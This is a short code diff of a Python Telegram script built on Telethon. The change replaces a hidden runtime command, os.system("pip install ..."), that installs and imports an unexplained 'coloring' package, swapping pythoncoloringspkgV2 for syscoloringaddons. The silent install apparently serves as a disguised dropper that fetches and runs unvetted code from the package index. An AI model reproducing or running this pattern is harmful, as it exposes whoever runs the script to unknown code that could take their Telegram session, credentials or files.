@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringspkgV2")
-import pythoncoloringspkgV2
+os.system("pip install syscoloringaddons")
+import syscoloringaddons
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
